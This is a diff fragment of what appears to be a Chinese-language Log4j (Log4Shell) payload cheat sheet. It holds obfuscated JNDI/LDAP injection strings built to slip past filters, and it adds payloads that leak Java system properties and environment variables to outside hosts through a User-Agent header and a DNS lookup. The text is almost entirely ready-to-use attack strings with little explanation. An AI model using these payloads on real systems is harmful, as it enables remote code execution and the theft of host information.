@@ -17,7 +17,11 @@ ${j${sdf:……%¥df:asdf:rX:-n}${hh:NLwGqf:-d}${::-i}:ldap://127.0.0.1:1389/ass
 unicode编码绕过：
 \ud83d\ude04${jndi:ldap://1.1.1.1:1389}
 
+JAVA运行参数
 User-Agent: ${jndi:ldap://1.1.1.1:987/${sys:user.name}/${sys:java.vendor}/x/${sys:user.home}/x/${sys:user.dir}/${sys:os.version}/${sys:java.class.path}}
+
+环境变量FUZZ：
+${jndi:ldap://u${hostName}-s2u-${env:USERNAME:-${env:USER}}.x.x.x:99999/1}
 
 ```
 ## 注意
